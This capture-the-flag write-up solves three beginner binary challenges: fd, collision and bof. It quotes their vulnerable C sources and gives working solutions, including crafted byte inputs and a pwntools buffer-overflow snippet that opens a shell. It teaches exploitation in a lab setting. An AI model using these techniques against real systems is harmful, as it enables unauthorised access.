## Toddler's Bottle Challenges

### [fd]

After ssh-ing into the box, we can run `ls` to see that there are three files present, a 32-bit Linux ELF executable, the source code for the executable, and a flag file.  Attempting to `cat` the flag yields a privilege error because we are a guest user.  Consequently, we need to use the executable to read the flag.  Examining the source code shows a call to `system("/bin/cat flag");` if the input buffer, read from a calculated file descriptor, is equivalent to `"LETMEWIN\n"`.  

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc<2){
                printf("pass argv[1] a number\n");
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp("LETMEWIN\n", buf)){
                printf("good job :)\n");
                system("/bin/cat flag");
                exit(0);
        }
        printf("learn about Linux file IO\n");
        return 0;

}
~~~

The trick for this is to understand that the Linux file descriptor for standard input is 0.  Since `fd` is calculated by taking the input argument minus `0x1234`, we need to use an input argument of 4660 (the equivalent value in decimal).  This allows us to pass standard input into the binary to be processed.  We can create a file with the required text, or use `echo` (which will automatically append a new line `\n` character to the end of the text).  Using `echo "LETMEWIN" | ./fd 4660` yields the flag.


### collision

We are presented with a similar situation to the previous challenge, and need to use the `col` binary to read the flag.  In this case, we need to present an input of 20 bytes which will be processed and compared to `0x21DD09EC`.  The "processing" includes casting the input from a character string to an integer array.  Since an integer is four bytes, the input will parsed into five groups.  It is important to run `file` on the binary to determine endianess - in this case, the result is `ELF 32-bit LSB executable`, indicating little-endian (Least Signficant Byte).  This means that the bytes in each group will be reversed when processed as integers.  The integers are then summed into a `res` variable which is returned and compared to `0x21DD09EC`.  

~~~c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
        int* ip = (int*)p;
        int i;
        int res=0;
        for(i=0; i<5; i++){
                res += ip[i];
        }
        return res;
}

int main(int argc, char* argv[]){
        if(argc<2){
                printf("usage : %s [passcode]\n", argv[0]);
                return 0;
        }
        if(strlen(argv[1]) != 20){
                printf("passcode length should be 20 bytes\n");
                return 0;
        }

        if(hashcode == check_password( argv[1] )){
                system("/bin/cat flag");
                return 0;
        }
        else
                printf("wrong passcode.\n");
        return 0;
}
~~~

We can calculate `0x21DD09EC/5` to determine which integers to send.  The result is `113626824.8`, which means we can send `113626825` four times and `113626824` once to return `0x21DD09EC`.  Converting these values to hex yields `0x6C5CEC9` and `0x6C5CEC8`, respectively.  Again, we need to arrange in little endian format to correctly process the integers.  It is easiest to use `echo -e -n` and pipe the result to the executable given the bytes are not ASCII characters (here the `-n` flag suppresses a new line character, which is necessary otherwise we would input 21 bytes, not 20).  Running `./col $(echo -n -e "\xc8\xce\xc5\x6\xc9\xce\xc5\x6\xc9\xce\xc5\x6\xc9\xce\xc5\x6\xc9\xce\xc5\x6")` yields the flag.

### bof
For this challenge we are provided links to download a bof executable and the corresponding C source code.  Doing a quick check with `file`, `bof` is again a 32-bit little-endian ELF executable.  A quick scan of the source code shows a `gets` vulnerability in the `puts()` function. Opening the binary in gdb and diassembling `func()` provides the binary's assembly code: 

~~~gdb
gdb-peda$ disass func
Dump of assembler code for function func:
   0x5655562c <+0>:     push   ebp
   0x5655562d <+1>:     mov    ebp,esp
   0x5655562f <+3>:     sub    esp,0x48
   0x56555632 <+6>:     mov    eax,gs:0x14
   0x56555638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
   0x5655563b <+15>:    xor    eax,eax
   0x5655563d <+17>:    mov    DWORD PTR [esp],0x5655578c
   0x56555644 <+24>:    call   0xf7e38420 <puts>
   0x56555649 <+29>:    lea    eax,[ebp-0x2c]
   0x5655564c <+32>:    mov    DWORD PTR [esp],eax
   0x5655564f <+35>:    call   0xf7e37940 <gets>
   0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x5655565b <+47>:    jne    0x5655566b <func+63>
   0x5655565d <+49>:    mov    DWORD PTR [esp],0x5655579b
   0x56555664 <+56>:    call   0xf7e0d000 <system>
   0x56555669 <+61>:    jmp    0x56555677 <func+75>
   0x5655566b <+63>:    mov    DWORD PTR [esp],0x565557a3
   0x56555672 <+70>:    call   0xf7e38420 <puts>
   0x56555677 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x5655567a <+78>:    xor    eax,DWORD PTR gs:0x14
   0x56555681 <+85>:    je     0x56555688 <func+92>
   0x56555683 <+87>:    call   0xf7edba20 <__stack_chk_fail>
   0x56555688 <+92>:    leave  
   0x56555689 <+93>:    ret  
~~~

This again shows there is no bound checking on the input; the binary will store the input buffer at `[esp]` which is equal to `[ebp - 0x2c]`.  Note also that a stack canary is used but not checked before running the system call.  Access to the system call requires passing the check: `cmp    DWORD PTR [ebp+0x8],0xcafebabe`.  Thus, a simple buffer overflow storing `0xcafebabe` at `ebp+0x8` is sufficient to get a shell (for full code, see `bof_solver.py`):

~~~python
def main(arguments):
    check = 0xcafebabe
    p = binary_connect(arguments)
    p.send(b'A'* 0x2c + b'B' * 8 + p32(check) + b'\n')
    p.interactive()
~~~
